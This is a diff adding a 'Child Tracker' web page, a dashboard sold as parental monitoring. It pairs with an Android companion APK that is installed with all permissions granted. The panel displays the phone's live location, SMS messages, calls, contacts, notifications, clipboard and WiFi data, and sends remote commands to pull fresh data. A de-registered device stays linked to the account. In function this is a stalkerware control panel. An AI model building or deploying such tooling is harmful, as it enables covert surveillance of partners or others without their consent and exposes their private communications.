@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Child Tracker — Parental Monitoring | ALL IN ONE TOOLBOX</title>
+  <meta name="description" content="Keep your children safe online. Monitor your child's phone in real time — location, calls, SMS, contacts, app notifications and more. Tied securely to your parent account.">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+  <style>
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+    :root{--bg:#0a0e17;--surface:#0f1520;--surface2:#161e2e;--surface3:#1c2740;
+      --border:#1e2d4a;--border-light:#2a3d60;--text:#e8edf5;--text-dim:#8899c4;
+      --text-muted:#5a6a92;--green:#00ff41;--cyan:#60cfff;--accent:#4f8cff;--accent-hover:#3a75e8;
+      --red:#ff3355;--gold:#ffd700;--orange:#ff9500;--blue:#3b82f6;--purple:#a855f7;
+      --font:'Inter','Segoe UI',system-ui,-apple-system,sans-serif;
+      --mono:'JetBrains Mono','Cascadia Code','Fira Code','Consolas',monospace;--radius:12px;--radius-sm:8px}
+    html,body{min-height:100%;background:var(--bg);color:var(--text);font-family:var(--font);font-size:15px;line-height:1.6}
+    ::-webkit-scrollbar{width:6px}::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}
+    a{color:var(--cyan);text-decoration:none;transition:.2s}a:hover{color:var(--accent)}
+    .top-bar{position:sticky;top:0;z-index:100;display:flex;align-items:center;justify-content:space-between;padding:0 24px;height:60px;background:rgba(10,14,23,.9);backdrop-filter:blur(20px);border-bottom:1px solid var(--border)}
+    .top-bar .brand{display:flex;align-items:center;gap:8px}
+    .top-bar .brand .logo{font-family:var(--mono);font-size:16px;font-weight:800;background:linear-gradient(135deg,#fff,var(--accent));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+    .top-bar .nav{display:flex;gap:4px;align-items:center}
+    .top-bar .nav a{padding:7px 14px;border-radius:var(--radius-sm);font-size:13px;color:var(--text-dim)}
+    .top-bar .nav a:hover{color:var(--text);background:var(--surface2)}
+    .container{max-width:1080px;margin:0 auto;padding:0 20px 70px}
+    .hero{text-align:center;padding:40px 0 14px}
+    .hero .icon{font-size:46px}
+    .hero h1{font-family:var(--mono);font-size:30px;letter-spacing:1px}
+    .hero h1 span{color:var(--accent)}
+    .hero p{color:var(--text-dim);font-size:14px;max-width:640px;margin:8px auto 0}
+    .hero .badges{display:flex;gap:8px;justify-content:center;flex-wrap:wrap;margin-top:12px}
+    .hero .badges span{padding:4px 12px;border-radius:20px;font-size:10px;font-family:var(--mono);background:rgba(79,140,255,.06);color:var(--accent);border:1px solid rgba(79,140,255,.18)}
+    .card{background:var(--surface2);border:1px solid var(--border);border-radius:var(--radius);padding:22px;margin-bottom:18px}
+    .card h2{font-size:15px;font-family:var(--mono);display:flex;align-items:center;gap:8px;margin-bottom:4px}
+    .card .sub{font-size:12px;color:var(--text-muted);margin-bottom:16px;line-height:1.6}
+    .field{display:flex;gap:8px;margin-top:8px;flex-wrap:wrap}
+    input,select{flex:1;min-width:150px;padding:11px 14px;background:var(--bg);border:1px solid var(--border);border-radius:var(--radius-sm);color:var(--text);font-size:14px;outline:none;font-family:inherit}
+    input:focus{border-color:var(--accent);box-shadow:0 0 0 3px rgba(79,140,255,.12)}
+    .btn{padding:11px 18px;background:var(--accent);border:none;border-radius:var(--radius-sm);color:#fff;font-size:14px;font-weight:700;cursor:pointer;font-family:inherit;transition:.2s;white-space:nowrap}
+    .btn:hover{background:var(--accent-hover)}
+    .btn:disabled{opacity:.5;cursor:not-allowed}
+    .btn.ghost{background:transparent;border:1px solid var(--border);color:var(--text-dim)}
+    .btn.ghost:hover{border-color:var(--accent);color:var(--accent)}
+    .btn.sm{padding:6px 12px;font-size:12px}
+    .btn.danger{background:rgba(255,51,85,.12);color:var(--red);border:1px solid rgba(255,51,85,.3)}
+    .msg{margin-top:12px;padding:11px 14px;border-radius:var(--radius-sm);font-size:13px;display:none}
+    .msg.err{background:rgba(255,51,85,.1);border:1px solid rgba(255,51,85,.3);color:#ff9aab}
+    .msg.ok{background:rgba(0,255,65,.08);border:1px solid rgba(0,255,65,.25);color:var(--green)}
+    /* device grid */
+    .dev-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:14px;margin-top:6px}
+    .dev{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:16px;cursor:pointer;transition:.2s;position:relative}
+    .dev:hover{border-color:var(--border-light);transform:translateY(-2px)}
+    .dev.active{border-color:var(--accent);box-shadow:0 0 0 2px rgba(79,140,255,.25)}
+    .dev .nm{font-weight:800;font-size:15px;display:flex;align-items:center;gap:7px}
+    .dev .meta{font-size:11.5px;color:var(--text-muted);font-family:var(--mono);margin-top:5px;word-break:break-all}
+    .dot{width:8px;height:8px;border-radius:50%;flex-shrink:0}
+    .dot.on{background:var(--green);box-shadow:0 0 8px var(--green)}
+    .dot.off{background:var(--text-muted)}
+    .dev .st{position:absolute;top:14px;right:14px;font-size:10px;font-family:var(--mono);color:var(--text-dim)}
+    /* tabs */
+    .tabs{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:16px;border-bottom:1px solid var(--border);padding-bottom:12px}
+    .tab{padding:8px 14px;border-radius:var(--radius-sm);font-size:13px;font-weight:600;cursor:pointer;color:var(--text-dim);background:var(--surface);border:1px solid var(--border)}
+    .tab:hover{color:var(--text)}
+    .tab.active{background:var(--accent);color:#fff;border-color:var(--accent)}
+    /* data list */
+    .rows{display:flex;flex-direction:column;gap:8px}
+    .row{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius-sm);padding:12px 14px;font-size:13px}
+    .row .rh{display:flex;justify-content:space-between;gap:10px;align-items:baseline}
+    .row .rt{font-family:var(--mono);font-size:11px;color:var(--text-muted);white-space:nowrap}
+    .row .rmain{font-weight:700;word-break:break-word}
+    .row .rbody{color:var(--text-dim);margin-top:4px;word-break:break-word;font-size:12.5px}
+    .empty{text-align:center;color:var(--text-muted);padding:40px 10px;font-size:13px}
+    #ct-map{height:340px;border-radius:var(--radius-sm);margin-top:6px;border:1px solid var(--border)}
+    .hidden{display:none!important}
+    .toolbar{display:flex;gap:8px;align-items:center;margin-bottom:14px;flex-wrap:wrap}
+    .toolbar .grow{flex:1}
+    .step{display:flex;gap:12px;align-items:flex-start;margin-bottom:12px}
+    .step .n{width:26px;height:26px;border-radius:50%;background:var(--accent);color:#fff;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:13px;flex-shrink:0}
+    .step .t{font-size:13px;color:var(--text-dim)}
+    .step .t b{color:var(--text)}
+    .dlbtn{display:inline-flex;align-items:center;gap:8px;background:linear-gradient(135deg,var(--accent),#6fa5ff);color:#fff;border-radius:10px;padding:12px 20px;font-weight:800;font-size:14px}
+  </style>
+</head>
+<body>
+  <nav class="top-bar">
+    <div class="brand"><span style="font-size:20px">🧒</span><span class="logo">CHILD TRACKER</span></div>
+    <div class="nav">
+      <a href="/">← Home</a>
+      <a href="/account">Account</a>
+      <span id="hae-auth-slot"></span>
+    </div>
+  </nav>
+
+  <div class="container">
+    <div class="hero">
+      <div class="icon">🛡️</div>
+      <h1>Child <span>Tracker</span></h1>
+      <p>Keep your children safe. Install the companion app on your child's phone, pair it once, and monitor their device in real time — location, calls, messages, contacts and app notifications. Everything is tied securely to your parent account.</p>
+      <div class="badges"><span>👨‍👩‍👧 PARENTAL CONTROL</span><span>📍 LIVE LOCATION</span><span>🔒 TIED TO YOUR ACCOUNT</span></div>
+    </div>
+
+    <!-- ===== NOT SIGNED IN ===== -->
+    <div id="gate" class="card hidden">
+      <h2>🔐 Sign in required</h2>
+      <div class="sub">Child Tracker is a members feature. Sign in or create a free account to pair and monitor your child's device.</div>
+      <button class="btn" onclick="Auth.open({note:'Sign in to use Child Tracker.'})">Sign in / Create account</button>
+    </div>
+
+    <!-- ===== MAIN ===== -->
+    <div id="main" class="hidden">
+      <!-- setup / pair -->
+      <div class="card">
+        <h2>➕ Add a child device</h2>
+        <div class="sub">Follow these steps once per device. The device stays tied to your account permanently.</div>
+        <div class="step"><div class="n">1</div><div class="t">On your child's phone, download &amp; install the companion app: <a class="dlbtn" style="margin-top:6px" href="/child-tracker/app.apk" download>⬇ Download Companion App (.apk)</a></div></div>
+        <div class="step"><div class="n">2</div><div class="t">Open the app once and <b>allow all permissions</b>. It will show a <b>6-character pairing code</b>.</div></div>
+        <div class="step"><div class="n">3</div><div class="t">Enter that pairing code below to link the device to your account.</div></div>
+        <div class="field">
+          <input id="claim-code" placeholder="Pairing code (e.g. K7P2QX)" maxlength="6" style="text-transform:uppercase;letter-spacing:2px;font-family:var(--mono)">
+          <input id="claim-nick" placeholder="Name (e.g. Tunde's phone)">
+          <button class="btn" id="claim-btn" onclick="claim()">Pair device</button>
+        </div>
+        <div id="claim-msg" class="msg"></div>
+      </div>
+
+      <!-- devices -->
+      <div class="card">
+        <div class="toolbar">
+          <h2 class="grow" style="margin:0">📱 My child devices</h2>
+          <button class="btn ghost sm" onclick="loadDevices()">↻ Refresh</button>
+        </div>
+        <div id="dev-empty" class="empty">No devices paired yet. Add one above ↑</div>
+        <div id="dev-grid" class="dev-grid"></div>
+      </div>
+
+      <!-- monitor -->
+      <div id="monitor" class="card hidden">
+        <div class="toolbar">
+          <h2 class="grow" style="margin:0">🔎 Monitoring: <span id="mon-name" style="color:var(--accent)"></span></h2>
+          <button class="btn ghost sm" onclick="refreshCurrent()">↻ Refresh data</button>
+          <button class="btn ghost sm" id="poll-btn" onclick="requestFresh()">📡 Ping device</button>
+          <button class="btn danger sm" onclick="unclaim()">🗑 De-register</button>
+        </div>
+        <div class="tabs" id="tabs"></div>
+        <div id="mon-body"></div>
+      </div>
+    </div>
+  </div>
+
+  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+  <script src="/auth.js"></script>
+  <script>
+    let currentDevice = null;
+    let currentTab = 'gps';
+    let map = null, mapLayer = null;
+    const TABS = [
+      { id:'gps', label:'📍 Location' },
+      { id:'sms', label:'💬 SMS' },
+      { id:'call', label:'📞 Calls' },
+      { id:'contact', label:'👥 Contacts' },
+      { id:'notification', label:'🔔 Notifications' },
+      { id:'app', label:'📦 Apps' },
+      { id:'clipboard', label:'📋 Clipboard' },
+      { id:'wifi', label:'📶 WiFi' },
+    ];
+
+    function tok(){ try{ return (window.Auth&&Auth.token)||localStorage.getItem('hae_token')||''; }catch(e){ return ''; } }
+    function esc(s){ return String(s==null?'':s).replace(/[&<>"]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c])); }
+    function fmtTime(t){ if(!t) return ''; const d=new Date(t); if(isNaN(d)) return esc(t); return d.toLocaleString(); }
+    function showMsg(el,txt,kind){ el.className='msg '+kind; el.textContent=txt; el.style.display='block'; }
+
+    async function api(path, opts={}){
+      const h = Object.assign({'Content-Type':'application/json'}, opts.headers||{});
+      const t = tok(); if(t) h['Authorization']='Bearer '+t;
+      const r = await fetch(path, Object.assign({}, opts, { headers:h }));
+      const d = await r.json().catch(()=>({ok:false,error:'Bad response'}));
+      if(r.status===401){ Auth.open({note:'Session expired — please sign in again.'}); throw new Error('Unauthorized'); }
+      return d;
+    }
+
+    // ── pairing ──
+    async function claim(){
+      const code=(document.getElementById('claim-code').value||'').trim().toUpperCase();
+      const nick=(document.getElementById('claim-nick').value||'').trim();
+      const msg=document.getElementById('claim-msg');
+      if(!code){ showMsg(msg,'Enter the 6-character pairing code shown in the app.','err'); return; }
+      const btn=document.getElementById('claim-btn'); btn.disabled=true; btn.textContent='Pairing…';
+      try{
+        const d=await api('/api/child/claim',{method:'POST',body:JSON.stringify({code,nickname:nick})});
+        if(!d.ok){ showMsg(msg,d.error||'Could not pair.','err'); return; }
+        showMsg(msg,'✅ Device paired! It will appear below.','ok');
+        document.getElementById('claim-code').value=''; document.getElementById('claim-nick').value='';
+        loadDevices();
+      }catch(e){ if(e.message!=='Unauthorized') showMsg(msg,'Error: '+e.message,'err'); }
+      finally{ btn.disabled=false; btn.textContent='Pair device'; }
+    }
+
+    // ── devices ──
+    async function loadDevices(){
+      try{
+        const d=await api('/api/child/devices');
+        const grid=document.getElementById('dev-grid');
+        const empty=document.getElementById('dev-empty');
+        const devices=(d.devices||[]).filter(x=>!x.deregistered);
+        if(!devices.length){ grid.innerHTML=''; empty.style.display='block'; return; }
+        empty.style.display='none';
+        grid.innerHTML=devices.map(dev=>`
+          <div class="dev ${currentDevice&&currentDevice.clientId===dev.clientId?'active':''}" onclick="openDevice('${esc(dev.clientId)}')">
+            <div class="st">${dev.isOnline?'online':'offline'}</div>
+            <div class="nm"><span class="dot ${dev.isOnline?'on':'off'}"></span>${esc(dev.nickname||'Child device')}</div>
+            <div class="meta">${esc(dev.manufacturer||'')} ${esc(dev.model||'')}<br>Android ${esc(dev.osVersion||'?')}<br>Last seen: ${fmtTime(dev.lastSeen)}</div>
+          </div>`).join('');
+        window._devices=devices;
+      }catch(e){}
+    }
+
+    function openDevice(clientId){
+      currentDevice=(window._devices||[]).find(x=>x.clientId===clientId);
+      if(!currentDevice) return;
+      document.getElementById('monitor').classList.remove('hidden');
+      document.getElementById('mon-name').textContent=currentDevice.nickname||'Child device';
+      // build tabs
+      document.getElementById('tabs').innerHTML=TABS.map(t=>`<div class="tab ${t.id===currentTab?'active':''}" onclick="switchTab('${t.id}')">${t.label}</div>`).join('');
+      loadDevices(); // repaint active state
+      switchTab(currentTab);
+      document.getElementById('monitor').scrollIntoView({behavior:'smooth'});
+    }
+
+    function switchTab(tab){
+      currentTab=tab;
+      document.querySelectorAll('.tab').forEach(el=>el.classList.toggle('active',el.textContent.includes(TABS.find(t=>t.id===tab).label)));
+      renderTab();
+    }
+
+    async function renderTab(){
+      const body=document.getElementById('mon-body');
+      if(!currentDevice){ body.innerHTML=''; return; }
+      body.innerHTML='<div class="empty">Loading…</div>';
+      let d;
+      try{ d=await api(`/api/child/data/${encodeURIComponent(currentDevice.clientId)}/${currentTab}`); }
+      catch(e){ body.innerHTML='<div class="empty">Could not load data.</div>'; return; }
+      const recs=d.records||[];
+      if(currentTab==='gps'){ renderGps(recs); return; }
+      if(!recs.length){ body.innerHTML='<div class="empty">No '+currentTab+' data yet. Tap “Ping device” to request a fresh pull (device must be online).</div>'; return; }
+      body.innerHTML='<div class="rows">'+recs.map(r=>renderRow(currentTab,r)).join('')+'</div>';
+    }
+
+    function renderRow(kind,r){
+      const t=fmtTime(r.__t);
+      if(kind==='sms') return row(esc(r.address||'Unknown'), esc(r.body||''), (r.type==1?'📥 Inbox':r.type==2?'📤 Sent':'')+' '+(r.date?fmtTime(+r.date):t));
+      if(kind==='call') return row(esc(r.phoneNo||r.name||'Unknown'), 'Duration: '+esc(r.duration||'0')+'s · '+esc(r.type||''), r.date?fmtTime(+r.date):t);
+      if(kind==='contact') return row(esc(r.name||'—'), esc(r.phoneNo||''), '');
+      if(kind==='notification') return row(esc(r.appName||r.packageName||'App'), esc(r.title||'')+' — '+esc(r.content||r.text||''), r.postTime?fmtTime(+r.postTime):t);
+      if(kind==='app') return row(esc(r.appName||r.name||r.packageName||'App'), esc(r.packageName||''), '');
+      if(kind==='clipboard') return row('Clipboard', esc(r.content||''), t);
+      if(kind==='wifi') return row(esc(r.SSID||'(hidden)'), 'BSSID: '+esc(r.BSSID||'')+' · '+esc(r.capabilities||''), '');
+      return row(esc(JSON.stringify(r).slice(0,80)), '', t);
+    }
+    function row(main,bodyTxt,time){
+      return `<div class="row"><div class="rh"><span class="rmain">${main}</span><span class="rt">${time||''}</span></div>${bodyTxt?`<div class="rbody">${bodyTxt}</div>`:''}</div>`;
+    }
+
+    function renderGps(recs){
+      const body=document.getElementById('mon-body');
+      const valid=recs.filter(r=>r.latitude&&r.longitude);
+      body.innerHTML='<div id="ct-map"></div>'+(valid.length?'':'<div class="empty" style="padding:16px">No location fixes yet. Tap “Ping device” to request the current GPS location (device must be online).</div>');
+      setTimeout(()=>{
+        try{
+          if(map){ map.remove(); map=null; }
+          const center = valid[0] ? [valid[0].latitude, valid[0].longitude] : [9.082, 8.6753];
+          map=L.map('ct-map').setView(center, valid.length?15:5);
+          L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{maxZoom:19,attribution:'© OpenStreetMap'}).addTo(map);
+          valid.slice(0,50).forEach((r,i)=>{
+            const m=L.marker([r.latitude,r.longitude]).addTo(map);
+            m.bindPopup(`<b>${i===0?'📍 Latest':'Fix'}</b><br>${fmtTime(r.__t)}<br>Accuracy: ${Math.round(r.accuracy||0)}m`);
+            if(i===0) m.openPopup();
+          });
+        }catch(e){}
+      },80);
+    }
+
+    async function refreshCurrent(){ renderTab(); }
+    async function requestFresh(){
+      if(!currentDevice) return;
+      const map2={gps:'gps',sms:'sms',call:'calls',contact:'contacts',wifi:'wifi',app:'apps'};
+      const cmd=map2[currentTab]; if(!cmd){ return; }
+      const btn=document.getElementById('poll-btn'); btn.disabled=true; btn.textContent='Requesting…';
+      try{
+        const d=await api(`/api/child/command/${encodeURIComponent(currentDevice.clientId)}`,{method:'POST',body:JSON.stringify({command:cmd})});
+        btn.textContent = d.ok ? '✓ Requested' : (d.error||'Offline');
+        setTimeout(()=>renderTab(), 3500);
+      }catch(e){}
+      finally{ setTimeout(()=>{ btn.disabled=false; btn.textContent='📡 Ping device'; }, 3000); }
+    }
+
+    async function unclaim(){
+      if(!currentDevice) return;
+      if(!confirm('De-register '+(currentDevice.nickname||'this device')+'? It will stop showing here but stays linked to your account and can be re-paired later.')) return;
+      try{
+        await api('/api/child/unclaim',{method:'POST',body:JSON.stringify({clientId:currentDevice.clientId})});
+        currentDevice=null;
+        document.getElementById('monitor').classList.add('hidden');
+        loadDevices();
+      }catch(e){}
+    }
+
+    // ── boot ──
+    Auth.mountButton('#hae-auth-slot').then(()=>{
+      if(Auth.isLoggedIn() && Auth.user){
+        document.getElementById('main').classList.remove('hidden');
+        document.getElementById('gate').classList.add('hidden');
+        loadDevices();
+        setInterval(loadDevices, 20000); // live-ish roster refresh
+      } else {
+        document.getElementById('gate').classList.remove('hidden');
+        document.getElementById('main').classList.add('hidden');
+      }
+    });
+    document.getElementById('claim-code').addEventListener('keydown',e=>{ if(e.key==='Enter') claim(); });
+  </script>
+</body>
+</html>
